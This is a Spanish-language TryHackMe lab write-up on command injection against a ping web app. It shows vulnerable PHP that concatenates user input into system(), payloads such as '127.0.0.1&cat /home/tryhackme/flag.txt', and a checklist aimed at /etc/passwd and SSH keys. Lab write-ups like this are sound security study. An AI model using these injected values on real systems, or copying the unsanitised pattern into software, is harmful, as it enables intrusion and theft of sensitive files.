# THM — Command Injection: Task 5 Practical

**Room:** Command Injection  
**Task:** 5 — Practical: Command Injection  
**Fecha:** 2026-03-29  
**Tags:** #tryhackme #command-injection #rce #web #linux

---

## Contexto del challenge

Aplicación web **DiagnoseIT** — permite hacer ping a una IP introducida por el usuario. El servidor ejecuta el comando internamente sin sanitizar el input.

**Código vulnerable (aproximado):**
```php
system("ping " . $_GET['ip']);
```

El input del usuario se concatena directamente al comando del sistema — vector clásico de Command Injection.

---

## Operadores de inyección en Linux

| Operador | Comportamiento | Ejemplo |
|----------|---------------|---------|
| `;` | Ejecuta el segundo comando siempre, independientemente del primero | `ping 127.0.0.1; whoami` |
| `&` | Ejecuta ambos comandos en paralelo (background) | `127.0.0.1&whoami` |
| `&&` | Ejecuta el segundo solo si el primero tiene éxito | `ping 127.0.0.1 && whoami` |
| `\|` | Pasa el output del primero como input del segundo | `ping 127.0.0.1 \| whoami` |
| `\|\|` | Ejecuta el segundo solo si el primero falla | `ping 127.0.0.1 \|\| whoami` |

> **Nota:** En este challenge se usó `&` sin espacios (`127.0.0.1&whoami`). Los espacios no siempre son necesarios y a veces los filtros los bloquean — probar sin ellos es buena práctica.

---

## Pasos seguidos

### 1. Reconocimiento inicial
Introducir el valor esperado (`127.0.0.1`) para entender qué hace la aplicación:

```
Input: 127.0.0.1
Output: resultado de ping a localhost
```

Confirma que el servidor ejecuta `ping` directamente — base para la inyección.

### 2. Identificar el usuario del sistema
```
Input: 127.0.0.1&whoami
Output: www-data [dentro del output del ping]
```

La aplicación corre como `www-data` — usuario típico de Apache/Nginx.

### 3. Leer el archivo de flag
```
Input: 127.0.0.1&cat /home/tryhackme/flag.txt
Output: THM{COMMAND_INJECTION_COMPLETE} [intercalado en el output del ping]
```

---

## Observaciones técnicas

**El output aparece intercalado** — con `&` ambos comandos corren en paralelo, por eso la flag aparece mezclada entre los paquetes ICMP del ping. Con `;` el output sería más limpio y secuencial.

**Sin espacios alrededor del operador** — `127.0.0.1&whoami` funciona igual que `127.0.0.1 & whoami`. Útil cuando hay filtros que bloquean espacios.

**www-data como usuario** — importante de cara a privilege escalation posterior. Este usuario tiene permisos limitados pero puede leer archivos con permisos de lectura global como `/home/tryhackme/flag.txt`.

---

## Metodología general para Command Injection

1. **Identificar el input** — ¿qué hace la aplicación con lo que introduces?
2. **Inferir el comando del servidor** — si hace ping, probablemente usa `system("ping " . $input)`
3. **Probar operadores** — empezar con `;` o `&` + comando simple (`whoami`, `id`)
4. **Confirmar ejecución** — ¿aparece output del comando inyectado?
5. **Escalar** — leer archivos, buscar credenciales, explorar el sistema

---

## Checklist Command Injection

- [ ] Identificar campos de input que interactúen con el sistema (ping, lookup, conversión, etc.)
- [ ] Probar operadores: `;`, `&`, `&&`, `|`
- [ ] Verificar usuario con `whoami` o `id`
- [ ] Explorar filesystem: `ls`, `cat`, `find`
- [ ] Buscar archivos sensibles: `/etc/passwd`, claves SSH, configs

---

## Comparativa con File Inclusion

| | Command Injection | File Inclusion (LFI) |
|--|------------------|---------------------|
| **Vector** | Input concatenado a comando del sistema | Input concatenado a `include()` de PHP |
| **Impacto** | RCE directo | Lectura de archivos (puede escalar a RCE) |
| **Operadores clave** | `;` `&` `&&` `\|` | `../` `%00` `php://` |
| **Usuario revelado** | `whoami` / `id` | `/etc/passwd` |

Ambas vulnerabilidades comparten la raíz: **input del usuario usado directamente en funciones del sistema sin sanitizar**.

---

## Referencias
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
